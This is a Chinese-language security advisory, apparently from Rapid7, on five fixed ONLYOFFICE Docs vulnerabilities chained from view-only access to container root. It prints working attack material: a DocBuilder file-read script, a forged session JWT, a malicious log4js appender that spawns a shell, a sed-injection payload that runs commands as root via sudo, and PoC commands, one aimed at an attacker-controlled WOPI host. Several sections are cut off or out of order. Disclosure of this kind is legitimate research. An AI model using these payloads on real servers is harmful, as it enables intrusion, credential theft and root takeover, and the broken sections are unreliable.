From view-only access to container root: five vulnerabilities in ONLYOFFICE Docs (FIXED)

AI 导读

Rapid7 在 ONLYOFFICE Docs Document Server 9.4.0-129 上披露并复现 5 个漏洞，包括 CVE-2026-113627、CVE-2026-110385、CVE-2026-97727、CVE-2026-113630 和 CVE-2026-113631。

值得关注

文章拆解了从只读权限到容器 root 的两条利用链，并公开 PoC 与修复前后验证过程，适合用于评估 DocumentServer 暴露风险。

概述

作为我们针对 Zimbra Collaboration Suite 的研究的一部分，Rapid7 报告了 ONLYOFFICE Docs 中的五项发现。拥有文档仅查看权限的攻击者可以串联 ONLYOFFICE Docs 中的漏洞，从而在官方 DocumentServer 容器内以 root 身份执行任意操作系统命令。

这些发现还会暴露服务器文件和查看器从不显示的文档数据，即使已禁用下载也是如此。

产品说明

ONLYOFFICE Docs 为文档、电子表格、演示文稿、表单和 PDF 提供在线查看器与编辑器。它支持协作编辑，并可与存储和共享文件的应用程序集成。

集成应用程序（例如 Zimbra Collaboration Suite）会提供一个打开配置，用于标识文档和用户权限，并使用 Browser 密钥签名。下文将这一客户端可见的凭据称为 Editor JWT。打开文档后，DocumentServer 会签发 Session JWT，用于重新连接和保存。

传入的服务请求（包括文档构建作业）使用 ONLYOFFICE 的 Inbox JWT 密钥进行验证。DocumentServer 还可将生成的文档输出发送到集成应用程序的回调 URL。

致谢

本次评估和漏洞利用链研究由 Rapid7 高级安全研究员 Jonah Burgess（CryptoCat）完成。这些发现依据 Rapid7 的漏洞披露政策 予以披露。

测试设置

Rapid7 使用官方 onlyoffice/documentserver:9.4.0 镜像和软件包 onlyoffice-documentserver 9.4.0-129 进行测试。DocumentServer 以 ds 账户运行。JWT 验证保持启用，未禁用或修改任何身份验证检查、私有地址筛选器或厂商代码。Browser 和 Inbox 验证使用相同的有效签名密钥。

我们对供应商提供的修复方案的分析比较了 v9.4.0.129 和 v10.0.0.169 版本的 ONLYOFFICE/server、ONLYOFFICE/core 和 ONLYOFFICE/document-server-package 标签。Rapid7 还对 10.0.0-169 包进行了针对性检查。对于 条件 WOPI 测试，Rapid7 仅在 9.4.0-129 中启用了 WOPI_ENABLED=true，并将随附的 WOPI IP 过滤器保持为默认的允许所有规则不变。

仅在 9.4.0-129 上演示了利用；受影响的更广版本范围尚不清楚。

影响

仅查看文档可能导致命令在官方容器内以 ds 身份执行，随后以 root 身份执行。这两条利用链使用不同的文件写入阶段。在启用 WOPI、攻击者控制的源可访问且获其 IP 过滤器允许的情况下，同一个 DocBuilder 授权失败提供了一个未经身份验证的入口。

此外，被拒绝下载的查看者可以获得一个重建的 DOCX，其中包含查看者从未显示过的自定义 XML、自定义属性和字段指令。

Editor JWT 授权原生文件读取以及会话 JWT 伪造（CVE-2026-113627）

拥有文档仅查看权限的攻击者可以使用 /docbuilder 从 ONLYOFFICE 服务器窃取文件。在测试的构建版本中，这暴露了 Session JWT 签名密钥，使攻击者能够伪造包含文档密钥和权限的凭据，而这些权限从未授予原始查看者。

技术分析

前提条件： 攻击者需要针对任意文档的有效 Editor JWT，并可访问 /docbuilder。目标文件必须可由 ds 读取。令牌伪造步骤还要求 Session JWT 签名密钥位于可读取的文件中，测试构建版本中即是如此。不需要编辑、下载、打印、审阅或评论权限。

getTenantSecret() 中的默认密钥分支包含：

switch (type) {
case commonDefines.c_oAscSecretType.Browser:
case commonDefines.c_oAscSecretType.Inbox:
    res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key
break;
// ... other token types omitted ...
}

[0] 处的分支会为 Browser 和 Inbox 令牌选择同一个已配置的签名密钥。

builderRequest() 将请求传递给 getRequestParams()：

const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation
if (authRes.isDecoded) {
  cmd.setWithAuthorization(true);
}

在 [1] 处，builderRequest() 将 JWT 验证委托给 getRequestParams()。该函数的查询令牌分支使用 Inbox 密钥检查签名：

if (tenTokenEnableRequestInbox) {
  res.code = constants.VKEY;
let checkJwtRes;
if (res.params.token) {
// [2] Inbox signature check
checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox);
  } else {
    checkJwtRes = yield checkJwtHeader(ctx, req);
  }
// ... remaining validation and decoded-claim handling omitted ...
}

仅查看权限的 Editor JWT 会在 [2] 处通过签名检查，因为 Browser 验证使用的是同一个密钥。该检查并不要求 JWT 是专门为 DocBuilder 签发的。

/docbuilder 将 POST 请求体视为 DocBuilder 脚本。在上述 JWT 检查成功后，该脚本可以调用 GetFontBinary() 并提供文件名：

std::wstring sFile = file->toStringW();
bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/'));
if (bIsFullFilePath)
{
    bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check
}

// ... font-map fallback omitted ...

return CJSContext::createUint8Array(sFile); // [4] Return file bytes

GetFontBinary() 接受 [3] 处给出的现有绝对路径，并返回 [4] 处对应的字节。Ssani4 曾于 2025 年 11 月 21 日在 DocumentBuilder issue #147 中报告了这种原生文件读取行为。该报告明确指出了 GetFontBinary() 和 ZipFileAsString()，并使用从 /downloadas 获取的 Session JWT 对 /docbuilder 进行授权。ONLYOFFICE 将该问题关闭为已修复，修复版本为 DocumentBuilder 9.2.0。

Rapid7 使用仅具备查看权限的 Editor JWT，在 9.4.0-129 中复现了 GetFontBinary() 文件读取问题，随后展示了会话签名密钥窃取和令牌伪造。原生读取行为此前已有报告；本文记录了该问题通过此入口持续暴露的情况及其在后续攻击链中的作用。

漏洞利用

读取服务器文件

攻击者提交一个 DocBuilder 脚本，并使用为任何文档的仅查看访问权限签发的 JWT。请求片段如下：

POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

builder.CreateFile("docx");
var bytes = native.GetFontBinary("/etc/passwd");
if (bytes === null || typeof bytes === "undefined") throw new Error("read failed");
var hex = "";
for (var i = 0; i < bytes.length; i++)
    hex += ("0" + bytes[i].toString(16)).slice(-2);
var paragraph = Api.CreateParagraph();
paragraph.AddText("R7FILE:" + hex + ":END");
Api.GetDocument().Push(paragraph);
builder.SaveFile("docx", "stolen.docx");
builder.CloseFile();

DocumentServer 以 ds 身份执行该脚本，并返回 stolen.docx 的 URL。PoC 下载 stolen.docx，从 word/document.xml 中提取 R7FILE: 与 :END 之间的十六进制数据，并对其进行解码，以恢复 /etc/passwd 的内容。十六进制编码支持二进制文件；分隔符使提取器能够定位载荷，并拒绝缺少任一边界的输出。

窃取会话签名密钥

攻击者针对 /etc/onlyoffice/documentserver/local.json 重复发送相同请求。在测试的配置中，services.CoAuthoring.secret.session.string 包含 Session JWT 签名密钥。如果 services.CoAuthoring.secret.session.file 指向的是密钥文件，攻击者则使用相同的 GetFontBinary() 请求读取该文件。

伪造保存凭据

攻击者选定文档密钥、权限和用户 ID，然后使用窃取的 Session JWT 密钥，通过 HMAC-SHA256 对以下声明进行签名。对于此次保存操作，用户 ID 无需对应现有账户：

{
  "document": {
    "key": "external-document-20260821",
    "permissions": {
      "download": true,
      "print": true
    }
  },
  "editorConfig": {
    "user": {
      "id": "rapid7-poc",
      "index": 1
    }
  },
  "iat": 1787329293,
  "exp": 1787329593
}

攻击者使用伪造的 JWT 和攻击者选定的文档密钥，提交普通的 SAVE_TYPE_PART_START 请求。DocumentServer 返回服务器生成的保存密钥，证明其接受了伪造凭据以及未经授予的文档权限。

PoC

该 文件读取和 JWT 伪造 PoC 使用仅具查看权限的 Editor JWT 读取 /etc/passwd、窃取 Session JWT 签名密钥，并验证为攻击者选择的文档密钥伪造的令牌：

python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --read-file /etc/passwd \
  --read-output /tmp/stolen-passwd \
  --document-key external-document-20260821 \
  --output-token /tmp/forged-session.jwt \
  --timeout 180

输出节选：

上面打印的 JWT 使用从 local.json 中恢复的密钥签名。在正常的保存密钥预留期间，DocumentServer 接受了该签名：

{"status":"ok","data":"_7717"}

影响

攻击者可以窃取任何可由 ds 读取的文件。在测试系统中，其中包括 Session JWT 签名密钥，使攻击者能够创建带有原始查看者从未被授予的文档密钥和权限的凭据。DocumentServer 接受了伪造的 JWT，并使用新的文档密钥执行保存操作。所演示的未授权保存操作导致 7.1 High 评分中的完整性影响较低。

同一 editor-JWT 授权失效还允许仅具查看权限的用户向 Api.CreateImage() 提供内网 URL。DocumentServer 获取该 URL，并在生成的 DOCX 中返回可解码的图像。这一范围较窄的后果与上述授权根本原因相同，不被视为单独的发现。

修复

在 10.0.0-169 中，builderRequest() 现在会告知令牌验证器这是一个 DocBuilder 请求：

-const authRes = yield docsCoServer.getRequestParams(ctx, req);
+authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);

使用默认设置时，新的 check 会拒绝包含文档打开字段的令牌，例如 editorConfig 和 WOPI fileInfo，即使其签名有效也是如此。这阻止了仅具查看权限的 Editor JWT 在 /docbuilder 处重用，已在 10.0.0-169 测试中得到确认。

该 原生文件读取代码 还会在服务器模式下根据字体映射检查所提供的路径。未知路径会回退到默认字体，而不会被当作请求的文件读取。

DocBuilder 转换参数注入可导致代码执行（CVE-2026-110385）

DocBuilder 脚本可以替换 DocumentServer 选择的源路径、目标路径和格式，将攻击者控制的文件提取到任何已存在且可由 ds 写入的目录中。在测试版本中，将 log4js appender 和运行时配置提取到 Data 目录后，DocService 无需重启即可加载并执行攻击者代码。

技术分析

前提条件： 攻击者需要提交能被 /docbuilder 接受的请求。目标目录必须已经存在且可由 ds 写入。要立即执行进程，还需要一个可写目录，其中包含 DocService 会监视的运行时配置；测试所用官方镜像中的默认 Data 目录满足此条件。

DocBuilder 文本脚本调度器 CDocBuilder::RunTextA() 会转发可选的第三个 builder.SaveFile() 参数，而未将其限制为受支持的转换选项：

const wchar_t* sParams = NULL;
if (nCountParameters > 2)
    sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML

// [1] Forward conversion parameters
int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);

位于 [0] 的第三个参数未经改动便传入 [1] 处的私有保存实现。

CDocBuilder_Private::SaveFile() 会对自身的源路径和目标路径进行 XML 编码，但随后将攻击者字符串作为原始 XML 追加：

oBuilder.WriteString(L"<?xml version=\"1.0\" 
encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>");
oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path
oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>");
oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path
oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>");
oBuilder.WriteString(std::to_wstring(type));

// ... remaining server-generated fields omitted ...

if (!sConvertionParams.empty())
{
    oBuilder.WriteString(sConvertionParams); // [4] Append raw XML
}

位于 [2] 和 [3] 的路径会进行 XML 编码，但在 [4] 追加的原始 XML 可以在服务器生成的值之后引入重复的任务字段。

X2T 的 InputParams 解析器 会按顺序处理元素，并在同名元素再次出现时替换已有值：

else if (_T("m_sFileFrom") == sName)
{
    RELEASEOBJECT(m_sFileFrom);
    m_sFileFrom = new std::wstring(sValue); // [5] Replace source path
}
else if (_T("m_sFileTo") == sName)
{
    RELEASEOBJECT(m_sFileTo);
    m_sFileTo = new std::wstring(sValue); // [6] Replace destination path
}
else if (_T("m_nFormatFrom") == sName)
{
    RELEASEOBJECT(m_nFormatFrom);
    m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format
}
else if (_T("m_nFormatTo") == sName)
{
    RELEASEOBJECT(m_nFormatTo);
    m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format
}

赋值 [5]–[8] 允许后续 XML 元素替换服务器选择的路径和格式。getConversionDirection() 会将源格式 2057（AVS_OFFICESTUDIO_FILE_OTHER_ZIP）和目标格式 0（AVS_OFFICESTUDIO_FILE_UNKNOWN）映射到目录提取操作：

else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom &&
         AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo)
    eRes = TCD_UNZIPDIR; // [9] Directory extraction mode

在 [9] 处选择的提取模式会到达 x2t() 的转换调度器，后者使用两个由攻击者选择的路径，且未进行范围限制验证：

case TCD_UNZIPDIR:
{
    result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive
}
break;

位于 [10] 的 zip2dir() 会读取攻击者选择的归档文件，并将其解压到所选目录中，该目录可由 ds 写入。

写入 DocService 的运行时配置为从此次文件写入到代码执行提供了一条途径。runtimeConfigManager 会监视配置目录，并在 runtime.json 创建或发生变化时自动重新加载它，同时将其中的攻击者可控日志选项传递给日志记录器：

getConfig(operationContext.global)
  .then(config => {
    logger.configureLogger(config?.log?.options); // [11] Reload logging options
})

这些选项会到达 configureLogger() 中的 [11]；该函数将其与缓存的配置合并，然后调用 log4js：

function configureLogger(options) {
const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options);
  log4js.configure(mergedOptions); // [12] Apply log4js configuration
}

在 [12] 处应用的配置会将 appender 的 type 设置为解压出的 JavaScript 模块的绝对路径。log4js 6.9.1 的 appender 加载器 会将非核心类型传给 require()，从而在 DocService 中执行该模块。

漏洞利用

准备载荷文件

要运行 id，名为 r7-NONCE.zip 的内层 ZIP 包含 r7-appender-NONCE.js：

require("child_process").execFile(
  "/bin/sh", ["/var/www/onlyoffice/Data/r7-command-NONCE.sh"]
);
exports.configure = () => () => {};

r7-command-NONCE.sh：

无密码维护命令将 ds 提升为 root（CVE-2026-113630）

已安装的 sudo 策略允许 ds 以 root 身份运行 documentserver-flush-cache.sh，且参数不受限制。该脚本将其 --hash 参数嵌入 GNU sed 表达式中，使以 ds 身份运行的代码能够以 root 身份执行任意命令。

技术分析

前提条件： 攻击者需要以 ds 身份在本地执行命令。

该 documentserver sudoers 文件 允许 ds 无需密码即可以 root 身份运行三个脚本，且参数不受限制：

Cmnd_Alias DS_ROOT_SCRIPTS = \
  /usr/bin/documentserver-letsencrypt.sh *, \
  /usr/bin/documentserver-generate-allfonts.sh *, \
  /usr/bin/documentserver-flush-cache.sh *  # [0] Unrestricted helper arguments

ds ALL=(root) NOPASSWD: DS_ROOT_SCRIPTS  # [1] Passwordless root execution

在 [0] 处，* 允许 ds 选择传递给 documentserver-flush-cache.sh 的所有参数。在 [1] 处，sudo 无需请求密码，即以 root 身份执行该脚本。

documentserver-flush-cache.sh 将完整的 --hash 参数赋给 HASH，并将其直接插入 sed 程序中：

while [ "$1" != "" ]; do
  case $1 in
    -h | --hash )
      if [ "$2" != "" ]; then
        HASH=$2  # [2] Unchecked hash argument
        shift
      fi
    ;;
    # ... restart option omitted ...
  esac
  shift
done
API_PATH="/var/www/M4_DS_PREFIX/web-apps/apps/api/documents/api.js"
cp -f ${API_PATH}.tpl ${API_PATH}
sed -i "s/{{HASH_POSTFIX}}/${HASH}/g" ${API_PATH}  # [3] Sed interpolation

在 [2] 处，脚本未应用字符允许列表或长度限制。在 [3] 处，攻击者可以控制 sed 替换文本、分隔符、标志以及 sed 程序中的其他命令。由于 sudo 已经更改了有效 UID，GNU sed 及其 e 标志所调用的每个命令都以 root 身份运行。

随包提供的 api.js.tpl 中包含一行匹配内容：

const ver = '/9.4.0-{{HASH_POSTFIX}}'; // [4] Sed match target

攻击者提供以下 --hash 值：

';id > \/tmp\/r7-root;#'/e;#

在 [3] 处的插值会生成以下 sed 表达式：

s/{{HASH_POSTFIX}}/';id > \/tmp\/r7-root;#'/e;#/g

注入的 / 提前结束了替换，使 e 成为一项shell 执行标志。最后的 ;# 将辅助程序追加的 /g 注释掉。

替换完成后，模板中 [4] 处的行变为：

const ver = '/9.4.0-';id > /tmp/r7-root;#'';

该 e 标志会将整行发送给 /bin/sh。Shell 尝试运行 const，但该操作失败，不过分号仍会启动 id。其输出被写入 /tmp/r7-root，而 # 会将末尾的引号注释掉。由于 sudo 以 root 身份启动辅助程序，因此 id 也以 root 身份运行。

漏洞利用

从以 ds 身份运行的进程中，攻击者提供一个 sed 表达式，用于终止预期的替换、执行命令，并将其余内容注释掉。

对于仅查看权限的远程利用链，SaveFile 阶段会将命令脚本写入 /var/www/onlyoffice/Data。加载的附加程序会使用参数数组调用 /usr/bin/sudo，并将 /bin/sh /var/www/onlyoffice/Data/r7-command-NONCE.sh 置于同一个 sed 载荷中。辅助程序以 root 身份执行该脚本，PoC 则发起额外的 /docbuilder 请求来读取其输出。

+    '') ;;
+    *[!A-Za-z0-9._-]*)

仅查看模式下的 sendForm 导出未渲染的文档数据（CVE-2026-113631）

技术分析

前提条件： 攻击者必须有权查看目标 DOCX，并正常连接一次以获取其 Session JWT。DocumentServer 必须能够访问攻击者替换后的回调。若要披露查看者所显示内容之外的信息，文档必须包含未渲染的数据。无需编辑、下载、复制、打印或表单填写权限。

仅查看模式下的编辑器连接会收到服务器签发的 Session JWT，用于重新连接。fillJwtByConnection() 按如下方式构造其载荷：

漏洞利用链

通向容器 root 的两条路径都利用了 DocBuilder 授权失败和 root helper，区别仅在于文件写入阶段。直接 DocBuilder 链 和 文件读取与路径遍历链 均已使用只读 Editor JWT 以及下方的条件式 WOPI 入口完成演示。

图 4：两条文件写入路径最终以 ds 和容器 root 权限执行命令。

未认证的 WOPI 入口

WOPI（Web Application Open Platform Interface） 是一种用于在在线编辑器中打开外部存储文件的协议。必须启用 WOPI，而默认情况下并未启用。DocumentServer 必须能够访问攻击者控制的源，并且其地址必须通过配置的 WOPI IP 过滤器。

攻击者向公共启动端点提交一个以 / 结尾的 WOPISrc 和空的访问令牌。wopiClient.js 中的启动逻辑会联系该源以获取可编辑文档元数据，并签署 Browser JWT：

const access_token = req.body['access_token'] || ''; // [0] Empty token default

// WOPI metadata is requested from the attacker-controlled source.

const secret = yield tenantManager.getTenantSecret(ctx, commonDefines.c_oAscSecretType.Browser);
params.token = jwt.sign(params, utils.getJwtHsKey(secret), options); // [1] Sign Browser JWT

当 [0] 处的访问令牌为空时，DocumentServer 会信任返回的元数据，并在 [1] 处签发已签名的 Browser JWT。该令牌的文档密钥来自 createDocId()，后者取 URL 的最后一段：

const fileId = wopiSrc.substring(wopiSrc.lastIndexOf('/') + 1); // [2] URL file identifier
let docId = undefined;
if ('view' !== mode) {
  docId = `${fileId}`; // [3] Editable document key
}

末尾的斜杠会使 [2] 处的 fileId 为空，并成为 [3] 处已签名的文档密钥。由于 Browser 和 Inbox 令牌使用相同的签名密钥，/docbuilder 会接受此 WOPI Browser JWT 作为授权凭据。空密钥还会触发 builderRequest() 中的新任务分支：

let docId = params.key;
// ... request setup omitted ...
const needCreateId = !docId; // [4] Empty-key job creation
// ... request validation omitted ...
if (needCreateId) {
  const task = yield* taskResult.addRandomKeyTask(ctx, undefined, 'bld_', 8); // [5] Allocate job key
  docId = task.key;
  // ... context setup omitted ...
}
// ... script body stored under the new job key ...
if (needCreateId) {
  // ... queue-data setup omitted ...
  yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW); // [6] Queue DocBuilder script
}

空密钥允许在 [4] 处创建任务；[5] 分配一个新密钥，[6] 则将提交的脚本排队执行。这为利用 DocBuilder 中的漏洞提供了未认证入口。

DocBuilder 链

  1. 授权：在 Editor JWT Authorizes Native File Reads and Session JWT Forgery 中记录的 /docbuilder 授权失败，接受仅具备查看权限的 Editor JWT，而不要求使用 DocBuilder 专用令牌。

  2. 代码执行： DocBuilder Conversion Parameter Injection Enables Code Execution 使 X2T 在作业目录之外提取攻击者提供的 appender、命令脚本和运行时配置。DocService 将该 appender 加载为 ds。

  3. Root 执行： appender 调用 Passwordless Maintenance Command Elevates ds to Root，无密码辅助程序以 root 身份执行所提供的命令。

该 DocBuilder PoC 使用仅具备查看权限的 Editor JWT 运行此链：

python3 pocs/docbuilder_savefile_params_rce.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --root \
  --command whoami \
  --runtime-absent

输出：

root

一次恶意的 /docbuilder 请求即可触发以容器 root 身份执行。随后 PoC 发起额外的 /docbuilder 请求以获取命令输出。

直接 SaveFile 路径也会使用由 WOPI 签发的 Browser JWT，在上述启用条件、过滤条件和可达性条件下，以 root 身份执行命令。

文件读取和目录遍历链

此路径增加了令牌伪造以及独立的文件写入阶段：

  1. 文件读取和令牌伪造： Editor JWT Authorizes Native File Reads and Session JWT Forgery 使用被接受的 editor 或 WOPI Browser JWT 读取会话签名密钥并伪造 save JWT。

  2. 代码执行： Complete-Save Format Traversal Enables Arbitrary File Write 使用该凭据安装 appender、命令脚本和运行时配置。DocService 将该 appender 加载为 ds。

  3. Root 执行： appender 调用 Passwordless Maintenance Command Elevates ds to Root，后者以 root 身份执行所提供的命令。

Editor-token PoC 的 --command 模式安装这三个执行文件并调用 root 辅助程序。它从仅具备查看权限的访问权限出发完成了此链，并返回 uid=0(root)。

该 WOPI PoC 在无需预先存在 JWT 的情况下执行此链。它最后写入 runtime.json，以便在 appender 和命令脚本就位后触发加载：

python3 pocs/wopi_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --public-wopi-src http://attacker.example.test:18084/document/ \
  --command whoami \
  --runtime-absent

输出：

root

在上述 WOPI 条件下，此链不需要预先存在的 DocumentServer 账户或令牌。

将 ONLYOFFICE Document Server 升级至最新受支持的版本，即 10.0 或更高版本。ONLYOFFICE 已确认 10.0 版本解决了全部五项发现。请参阅 10.0.0 安全发布说明以及厂商提供的 Community Edition Docker 更新说明。
